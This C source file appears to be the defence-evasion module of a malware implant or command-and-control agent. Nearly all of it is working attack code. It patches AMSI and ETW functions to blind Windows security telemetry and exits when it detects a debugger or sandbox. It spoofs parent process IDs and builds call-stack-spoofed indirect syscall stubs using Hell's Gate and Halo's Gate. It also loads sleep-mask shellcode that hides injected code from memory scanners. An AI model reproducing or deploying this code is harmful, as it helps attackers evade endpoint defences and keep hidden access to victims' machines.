#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <ctype.h>
#include "evasion.h"
#include "evasion_pic_ctx.h"
#include "evasion_pic_bytes.h"
#include "api_resolve.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

/* ─── Compile-time sleep mask mode ────────────────────────────────────────
 * 0 = none      — plain NtDelayExecution (default; safe for all transports)
 * 1 = xor       — XOR registered regions during sleep
 * 2 = noaccess  — XOR + PAGE_NOACCESS
 * 3 = ekko      — timer-queue callbacks; main thread parks in ntdll
 * 4 = foliage   — APC chain on dedicated suspended thread
 *
 * All modes share a single pre-compiled PIC shellcode blob
 * (evasion_pic_bytes.h).  The mode is written into SleepMaskCtx.mode at
 * runtime so evasion_pic_bytes.h is built once and works for all modes.
 */
#ifndef AGENT_SLEEP_MASK_MODE
#define AGENT_SLEEP_MASK_MODE 0
#endif

/* NtDelayExecution typedef — used only for the fallback plain-sleep path */
typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);
static NtDelay_t g_NtDelay = NULL;

/* External shellcode regions registered for sleep masking. */
#define MAX_EVASION_REGIONS 8
typedef struct { void *base; SIZE_T sz; } EvasionRegion;
static EvasionRegion g_ev_regions[MAX_EVASION_REGIONS];
static int           g_ev_count = 0;

/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips
 * PAGE_NOACCESS to avoid faulting threads executing in registered regions. */
static volatile LONG g_conn_thread_count = 0;

/* ── PIC sleep mask runtime state ──────────────────────────────────────── */
static void        *g_pic_base  = NULL;  /* VirtualAlloc'd RX page */
static SleepMaskCtx g_pic_ctx;           /* persists across sleep calls */

typedef void (*sleep_fn_t)(SleepMaskCtx *);
static sleep_fn_t   g_pic_sleep = NULL;  /* → g_pic_ctx.fn_sleep_mask_entry */

typedef void (*fill_fn_t)(SleepMaskCtx *);

void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }

/* Register an external shellcode region for sleep masking.
 * Call after injecting shellcode into a remote section/allocation. */
void evasion_register_region(void *base, SIZE_T sz) {
    if (g_ev_count < MAX_EVASION_REGIONS && base && sz) {
        g_ev_regions[g_ev_count].base = base;
        g_ev_regions[g_ev_count].sz   = sz;
        g_ev_count++;
    }
}

/* ── Startup helper: inline-patch an exported function to ret-0 ─────────── */
static void patch_fn(const char *mod, const char *sym) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return;
    FARPROC fn = GetProcAddress(h, sym);
    if (!fn) return;
    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    memcpy((void*)fn, p, 3);
    VirtualProtect((void*)fn, 3, old, &old);
}

/* ── Sandbox / analysis environment detection ──────────────────────────────
 * Score-based: exits silently if score >= 4.  Called before evasion_init().
 */
void sandbox_check(void) {
    if (IsDebuggerPresent()) ExitProcess(0);  /* immediate */

    int score = 0;

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    /* RAM */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        if (ms.ullTotalPhys < (ULONGLONG)512  * 1024 * 1024) score += 3;
        else if (ms.ullTotalPhys < (ULONGLONG)1024 * 1024 * 1024) score++;
    }

    /* Disk C: */
    ULARGE_INTEGER totalBytes;
    totalBytes.QuadPart = 0;
    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL))
        if (totalBytes.QuadPart < (ULONGLONG)40 * 1024 * 1024 * 1024) score++;

    /* Username */
    char username[128] = {0};
    DWORD u_sz = sizeof(username);
    GetUserNameA(username, &u_sz);
    char low_u[128] = {0};
    for (int i = 0; username[i] && i < 127; i++)
        low_u[i] = (char)tolower((unsigned char)username[i]);
    const char *bad[] = {"sandbox","malware","virus","analyst","cuckoo","maltest","vmuser","tequilaboomboom"};
    for (int i = 0; i < 8; i++)
        if (strstr(low_u, bad[i])) { score += 3; break; }

    if (score >= 4) ExitProcess(0);
}

/* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
int spawn_with_ppid(const char *cmd, const char *parent_name) {
    char lp[MAX_PATH] = {0};
    for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++)
        lp[i] = (char)tolower((unsigned char)parent_name[i]);

    /* Walk the process list and try each matching process in order.
     * Skip PID 0 (Idle) and PID 4 (System) — they cannot be opened.
     * Try all candidates so a protected/exited process doesn't block us. */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    /* Collect up to 8 candidate PIDs without holding the snapshot open */
    DWORD candidates[8] = {0};
    int   ncand = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
            char narrow[MAX_PATH] = {0};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                narrow, sizeof(narrow)-1, NULL, NULL);
            char lo[MAX_PATH] = {0};
            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++)
                lo[i] = (char)tolower((unsigned char)narrow[i]);
            if (strcmp(lo, lp) == 0 && ncand < 8)
                candidates[ncand++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!ncand) return 0;

    /* Try each candidate until one succeeds */
    HANDLE hParent = NULL;
    for (int i = 0; i < ncand; i++) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, candidates[i]);
        if (hParent) break;
    }
    if (!hParent) return 0;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_sz);
    if (!attrList) { CloseHandle(hParent); return 0; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }

    STARTUPINFOEXW siEx;
    ZeroMemory(&siEx, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = attrList;

    int wcmd_len = MultiByteToWideChar(CP_UTF8, 0, cmd, -1, NULL, 0);
    if (wcmd_len <= 0) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
    if (!wcmd) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wcmd, wcmd_len);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* No CREATE_SUSPENDED — resume flag is an extra EDR hook target and is
     * unnecessary for PPID spoofing.  CREATE_NEW_PROCESS_GROUP isolates
     * Ctrl+C / console signal inheritance from the agent's session. */
    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        NULL, NULL, &siEx.StartupInfo, &pi);
    DWORD cp_err = GetLastError();   /* capture immediately before any other call */

    HeapFree(GetProcessHeap(), 0, wcmd);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    if (!ok) { SetLastError(cp_err); return 0; }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

/* Thread wrapper — SEH via AddVectoredExceptionHandler (registered in
 * evasion_init) catches any exception from inside CreateProcessW.
 * The error from CreateProcessW is captured inside spawn_with_ppid and
 * stored in w->err so WaitForSingleObject + CloseHandle can't clobber it. */
DWORD WINAPI ppid_worker(LPVOID arg) {
    PpidWork *w = (PpidWork *)arg;
    w->ok  = spawn_with_ppid(w->cmd, w->parent);
    w->err = (w->ok == 1) ? 0 : GetLastError();
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Phase 10: Call-stack spoofing
 *
 * 110-byte spoofed indirect-syscall stubs are built in a VirtualAlloc'd page
 * (RW → write stubs → RX).  Each stub:
 *   1. sub rsp,8  — opens a slot for the fake return address
 *   2. slides any stack-passed args (args 5-11) down by one slot
 *   3. plants a call-preceded RET address from ntdll at [RSP]
 *   4. issues an indirect syscall via a "syscall;ret" gadget also in ntdll
 *
 * The stack-walker sees a coherent ntdll call chain and no agent .text frame.
 * ═══════════════════════════════════════════════════════════════════════════ */

#define SPOOF_STUB_SIZE 110

static LPVOID    g_spoof_page    = NULL;
static int       g_spoof_count   = 0;
static int       g_spoof_ok      = 0;
static ULONG_PTR g_syscall_gadget = 0;   /* VA of ntdll "syscall;ret" */
static ULONG_PTR g_spoof_gadget   = 0;   /* VA of ntdll "call;...;ret" (the C3) */

/* Exported spoofed-stub pointers */
NtAllocVMem_t      g_NtAllocVM    = NULL;
NtProtVMem_t       g_NtProtVM     = NULL;
NtCreateThreadEx_t g_NtCreateThread = NULL;
NtDelayExec_t      g_NtDelayExec  = NULL;

/* ── PE little-endian helpers ─────────────────────────────────────────────── */
static unsigned short pe_r16(const unsigned char *p, int o) {
    return (unsigned short)p[o] | ((unsigned short)p[o+1] << 8);
}
static unsigned int pe_r32(const unsigned char *p, int o) {
    return (unsigned int)p[o]        | ((unsigned int)p[o+1] << 8) |
           ((unsigned int)p[o+2] << 16) | ((unsigned int)p[o+3] << 24);
}

/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── */
static unsigned short spoof_get_ssn(HMODULE ntdll, const char *name) {
    const unsigned char *fn = (const unsigned char *)GetProcAddress(ntdll, name);
    if (!fn) return 0;
    /* Unpatched stub: 4C 8B D1  B8 lo hi 00 00  0F 05  C3 */
    if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
        return (unsigned short)fn[4] | ((unsigned short)fn[5] << 8);
    /* Halo's Gate: scan forward neighbours (each stub is 32 bytes apart) */
    for (int i = 1; i <= 5; i++) {
        const unsigned char *nb = fn + (i * 32);
        if (nb[0]==0x4C && nb[1]==0x8B && nb[2]==0xD1 && nb[3]==0xB8) {
            unsigned short base_ssn = (unsigned short)nb[4] | ((unsigned short)nb[5] << 8);
            return (base_ssn >= (unsigned short)i) ? base_ssn - (unsigned short)i : 0;
        }
    }
    return 0;
}

/* ── Scan ntdll .text for "syscall;ret" (0F 05 C3) ──────────────────────── */
static ULONG_PTR spoof_find_syscall_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        for (unsigned int off = 0; off + 3 <= vsz; off++)
            if (mem[off]==0x0F && mem[off+1]==0x05 && mem[off+2]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Scan ntdll .text for "call rel32; ret" — return VA of the C3 byte ──── */
static ULONG_PTR spoof_find_spoof_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        /* Require off >= 5 so mem[off-5] is always in range */
        for (unsigned int off = 5; off < vsz; off++)
            if (mem[off-5]==0xE8 && mem[off]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Write one 110-byte spoofed stub into g_spoof_page ───────────────────── *
 *
 * Stub layout (identical to the Nim Phase-10 stubs in agent-nim/syscalls.nim):
 *  +0   48 83 EC 08               sub  rsp, 8
 *  +4   4C 8B 5C 24 30            mov  r11, [rsp+0x30]  ─┐
 *  +9   4C 89 5C 24 28            mov  [rsp+0x28], r11   │ slide args 5-11
 *  +14  ...                        (× 7 pairs, 10 B each) │ down by 8 bytes
 *  +74  49 BB <8>                  mov  r11, spoof_gadget ; fake ret addr
 *  +84  4C 89 1C 24               mov  [rsp], r11
 *  +88  4C 8B D1                  mov  r10, rcx
 *  +91  B8 lo hi 00 00            mov  eax, SSN
 *  +96  FF 25 00 00 00 00         jmp  [rip+0]
 *  +102 <8>                        → syscall_gadget
 */
static void *spoof_make_stub(unsigned short ssn) {
    if (!g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    unsigned char *p = (unsigned char *)g_spoof_page + (g_spoof_count * SPOOF_STUB_SIZE);
    g_spoof_count++;

    static const unsigned char src_slots[7] = {0x30,0x38,0x40,0x48,0x50,0x58,0x60};
    static const unsigned char dst_slots[7] = {0x28,0x30,0x38,0x40,0x48,0x50,0x58};

    /* +0: sub rsp, 8 */
    p[0]=0x48; p[1]=0x83; p[2]=0xEC; p[3]=0x08;

    /* +4..+73: 7 pairs of (mov r11,[rsp+src]; mov [rsp+dst],r11) */
    int off = 4;
    for (int i = 0; i < 7; i++) {
        p[off+0]=0x4C; p[off+1]=0x8B; p[off+2]=0x5C; p[off+3]=0x24; p[off+4]=src_slots[i];
        p[off+5]=0x4C; p[off+6]=0x89; p[off+7]=0x5C; p[off+8]=0x24; p[off+9]=dst_slots[i];
        off += 10;
    } /* off == 74 */

    /* +74: mov r11, spoof_gadget  (49 BB <8-byte LE>) */
    p[74]=0x49; p[75]=0xBB;
    memcpy(p + 76, &g_spoof_gadget, 8);

    /* +84: mov [rsp], r11  (4C 89 1C 24) */
    p[84]=0x4C; p[85]=0x89; p[86]=0x1C; p[87]=0x24;

    /* +88: mov r10, rcx  (4C 8B D1) */
    p[88]=0x4C; p[89]=0x8B; p[90]=0xD1;

    /* +91: mov eax, SSN  (B8 lo hi 00 00) */
    p[91]=0xB8; p[92]=(unsigned char)(ssn & 0xFF); p[93]=(unsigned char)(ssn >> 8);
    p[94]=0x00; p[95]=0x00;

    /* +96: jmp [rip+0]  (FF 25 00 00 00 00) */
    p[96]=0xFF; p[97]=0x25; p[98]=0x00; p[99]=0x00; p[100]=0x00; p[101]=0x00;

    /* +102: syscall gadget address  (8-byte LE) */
    memcpy(p + 102, &g_syscall_gadget, 8);

    return (void *)p;
}

/* ── Public API ───────────────────────────────────────────────────────────── */

void init_stack_spoof(void) {
    /* Use the already-loaded ntdll for SSN resolution.
     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) to get a
     * "clean" copy, but that caused heap corruption (FTH abcc): the loader
     * makes internal heap allocations for the module entry that are left
     * incomplete, corrupting the process heap. On unhooked targets the live
     * ntdll stubs have the standard 4C 8B D1 B8 pattern and no second copy
     * is needed; Halo's Gate neighbours handle the hooked-stub fallback. */
    HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
    if (!ntdll_live) return;

    /* Resolve SSNs (Hell's Gate / Halo's Gate) */
    unsigned short ssn_alloc = spoof_get_ssn(ntdll_live, "NtAllocateVirtualMemory");
    unsigned short ssn_prot  = spoof_get_ssn(ntdll_live, "NtProtectVirtualMemory");
    unsigned short ssn_thr   = spoof_get_ssn(ntdll_live, "NtCreateThreadEx");
    unsigned short ssn_delay = spoof_get_ssn(ntdll_live, "NtDelayExecution");

    /* Scan live (in-memory) ntdll for both gadgets */
    ULONG_PTR base = (ULONG_PTR)ntdll_live;
    g_syscall_gadget = spoof_find_syscall_gadget(base);
    g_spoof_gadget   = spoof_find_spoof_gadget(base);

    if (!g_syscall_gadget || !g_spoof_gadget) return;

    /* Allocate RW page, write stubs, then lock to RX */
    g_spoof_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_spoof_page) return;

    g_NtAllocVM      = (NtAllocVMem_t)     spoof_make_stub(ssn_alloc);
    g_NtProtVM       = (NtProtVMem_t)      spoof_make_stub(ssn_prot);
    g_NtCreateThread = (NtCreateThreadEx_t)spoof_make_stub(ssn_thr);
    g_NtDelayExec    = (NtDelayExec_t)     spoof_make_stub(ssn_delay);

    DWORD old;
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    g_spoof_ok = 1;
}

void *spoof_syscall_stub(unsigned short ssn) {
    if (!g_spoof_ok || !g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    /* Briefly re-open for writing, append stub, re-seal */
    DWORD old;
    if (!VirtualProtect(g_spoof_page, 4096, PAGE_READWRITE, &old)) return NULL;
    void *stub = spoof_make_stub(ssn);
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    return stub;
}

void amsi_bypass(void) {
#ifdef AGENT_AMSI_BYPASS
    patch_fn("amsi.dll", "AmsiScanBuffer");
    patch_fn("amsi.dll", "AmsiScanString");
#endif
#ifdef AGENT_ETW_BYPASS
    patch_fn("ntdll.dll", "EtwEventWrite");
#endif
}

void evasion_init(void) {
#ifdef AGENT_AMSI_BYPASS
    patch_fn("amsi.dll", "AmsiScanBuffer");
    patch_fn("amsi.dll", "AmsiScanString");
#endif
#ifdef AGENT_ETW_BYPASS
    patch_fn("ntdll.dll", "EtwEventWrite");
#endif

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE k32   = GetModuleHandleA("kernel32.dll");

    /* Keep a direct NtDelayExecution pointer for the fallback sleep path
     * (used when PIC failed to load). */
    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");

    /* ── Load PIC sleep mask shellcode into an anonymous RX allocation ────
     *
     * The shellcode (evasion_pic_bytes.h) is pre-compiled with -nostdlib so
     * it contains zero imports and zero .rodata references.  By living in a
     * VirtualAlloc'd page rather than the PE's .evasn section, Windows never
     * looks up .pdata for that address range, eliminating the heap-corruption
     * crash that RtlAddFunctionTable was working around. */
    {
        LPVOID pic = VirtualAlloc(NULL, evasion_pic_bin_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pic) goto skip_pic;

        memcpy(pic, evasion_pic_bin, evasion_pic_bin_len);

        DWORD old = 0;
        if (!VirtualProtect(pic, evasion_pic_bin_len, PAGE_EXECUTE_READ, &old)) {
            VirtualFree(pic, 0, MEM_RELEASE);
            goto skip_pic;
        }
        g_pic_base = pic;

        /* Zero the context so any unresolved pointers are NULL (= safe
         * fallback in the PIC: missing fn ptr → skip that mode step). */
        memset(&g_pic_ctx, 0, sizeof(g_pic_ctx));

        /* Fill all NT / kernel32 function pointers the PIC may need.
         * We resolve all of them unconditionally; unused ones stay NULL. */
        g_pic_ctx.NtDelay             = (pic_i64 (*)(pic_i32, pic_i64 *))
            GetProcAddress(ntdll, "NtDelayExecution");
        g_pic_ctx.VProt               = (pic_i32 (*)(void *, pic_u64, pic_u32, pic_u32 *))
            GetProcAddress(k32, "VirtualProtect");
        g_pic_ctx.NtCreateThreadEx    = (pic_i64 (*)(void **, pic_u64, void *, void *,
                                                       void *, void *, pic_u64,
                                                       pic_u64, pic_u64, pic_u64, void *))
            GetProcAddress(ntdll, "NtCreateThreadEx");
        g_pic_ctx.NtQueueApcThread    = (pic_i64 (*)(void *, void *, void *, void *, void *))
            GetProcAddress(ntdll, "NtQueueApcThread");
        g_pic_ctx.NtAlertResumeThread = (pic_i64 (*)(void *, pic_u32 *))
            GetProcAddress(ntdll, "NtAlertResumeThread");
        g_pic_ctx.NtTestAlert         = (pic_i64 (*)(void))
            GetProcAddress(ntdll, "NtTestAlert");
        g_pic_ctx.CreateEventA        = (void *(*)(void *, pic_i32, pic_i32, const char *))
            GetProcAddress(k32, "CreateEventA");
        g_pic_ctx.SetEvent            = (pic_i32 (*)(void *))
            GetProcAddress(k32, "SetEvent");
        g_pic_ctx.CloseH              = (pic_i32 (*)(void *))
            GetProcAddress(k32, "CloseHandle");
        g_pic_ctx.WaitForSingleObject = (pic_u32 (*)(void *, pic_u32))
            GetProcAddress(k32, "WaitForSingleObject");
        g_pic_ctx.CreateTimerQueue    = (void *(*)(void))
            GetProcAddress(k32, "CreateTimerQueue");
        g_pic_ctx.CreateTimerQueueTimer = (pic_i32 (*)(void **, void *, void *, void *,
                                                         pic_u32, pic_u32, pic_u32))
            GetProcAddress(k32, "CreateTimerQueueTimer");
        g_pic_ctx.DeleteTimerQueueEx  = (pic_i32 (*)(void *, void *))
            GetProcAddress(k32, "DeleteTimerQueueEx");

        /* Compile-time mode → written once; stays in ctx for every sleep. */
        g_pic_ctx.mode = (pic_u32)AGENT_SLEEP_MASK_MODE;

        /* Call pic_fill_exports (at offset 0 of shellcode) to populate
         * the fn_* callback addresses with their runtime VAs in the alloc. */
        ((fill_fn_t)g_pic_base)(&g_pic_ctx);

        /* Cache the main dispatch entry point. */
        g_pic_sleep = (sleep_fn_t)g_pic_ctx.fn_sleep_mask_entry;
    }
skip_pic:

#ifdef AGENT_STACK_SPOOF
    init_stack_spoof();
#endif
}

/* ══════════════════════════════════════════════════════════════════════════
 * sleep_masked — public API called by the agent beacon loop.
 *
 * Prepares SleepMaskCtx with the current sleep duration, region list, and
 * conn_thread count, then calls into the PIC shellcode loaded by
 * evasion_init().  If the PIC failed to load (VirtualAlloc error at startup),
 * falls back to a plain NtDelayExecution call.
 *
 * The sleep mask logic (XOR, NOACCESS, Ekko, FOLIAGE) lives entirely in the
 * anonymous VirtualAlloc RX page — no PE section, no .pdata requirement.
 * ══════════════════════════════════════════════════════════════════════════ */
void sleep_masked(DWORD ms) {
    if (g_pic_sleep) {
        /* Snapshot current state into ctx.  The PIC reads these at the start
         * of each sleep call and does not modify g_ev_regions / g_ev_count. */
        g_pic_ctx.ms               = (pic_u32)ms;
        g_pic_ctx.conn_thread_count = (pic_i32)InterlockedOr(&g_conn_thread_count, 0);
        g_pic_ctx.region_count      = g_ev_count;
        for (int i = 0; i < g_ev_count; i++) {
            g_pic_ctx.regions[i].base = g_ev_regions[i].base;
            g_pic_ctx.regions[i].sz   = (pic_u64)g_ev_regions[i].sz;
        }
        g_pic_sleep(&g_pic_ctx);
    } else {
        /* Fallback: plain non-alertable sleep (PIC not loaded). */
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        if (g_NtDelay) g_NtDelay(FALSE, &t);
        else            Sleep(ms);
    }
}

/* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */

#define MEM_SCRAMBLE_KEY 0xA7

static volatile int  g_scrambler_stop    = 0;
static int           g_scrambler_running = 0;
static HANDLE        g_scrambler_thread  = NULL;
static unsigned char g_scrambler_buf[4096];

static DWORD WINAPI scrambler_thread_proc(LPVOID p) {
    DWORD interval_ms = (DWORD)(uintptr_t)p;
    int encrypted = 0;
    while (!g_scrambler_stop) {
        Sleep(interval_ms);
        if (g_scrambler_stop) break;
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
        encrypted = !encrypted;
    }
    if (encrypted)
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
    return 0;
}

void mem_fluctuate_stop(void) {
    if (!g_scrambler_running) return;
    g_scrambler_stop = 1;
    if (g_scrambler_thread) {
        WaitForSingleObject(g_scrambler_thread, 5000);
        CloseHandle(g_scrambler_thread);
        g_scrambler_thread = NULL;
    }
    g_scrambler_running = 0;
    g_scrambler_stop    = 0;
}

void mem_fluctuate_start(int interval_sec) {
    mem_fluctuate_stop();
    DWORD ms = (DWORD)(interval_sec > 0 ? interval_sec : 10) * 1000;
    g_scrambler_stop   = 0;
    g_scrambler_thread = CreateThread(NULL, 0, scrambler_thread_proc,
        (LPVOID)(uintptr_t)ms, 0, NULL);
    if (g_scrambler_thread) g_scrambler_running = 1;
}
